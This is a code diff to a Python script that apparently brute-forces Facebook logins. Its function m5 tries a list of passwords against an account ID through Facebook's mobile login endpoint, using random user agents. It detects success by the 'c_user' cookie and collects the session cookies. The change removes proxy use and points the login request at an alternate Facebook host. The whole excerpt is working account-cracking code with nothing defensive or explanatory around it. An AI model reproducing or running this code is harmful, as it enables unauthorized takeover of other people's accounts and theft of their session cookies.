@@ -1326,7 +1326,6 @@ def m5(idf,pwv):
  try:
   for ps in pwv:
    session = requests.Session()
-   session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    ua = random.choice(usragent)
    free_fb = session.get('https://m.facebook.com').text
    log_data ={
@@ -1355,7 +1354,7 @@ def m5(idf,pwv):
     'DNT': '1',
     'Pragma': 'no-cache',
     'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
-   lo = session.post('https://m.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=101',data=log_data,headers=header_freefb,proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'}).text
+   lo = session.post('https://mbasic.alpha.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=101',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
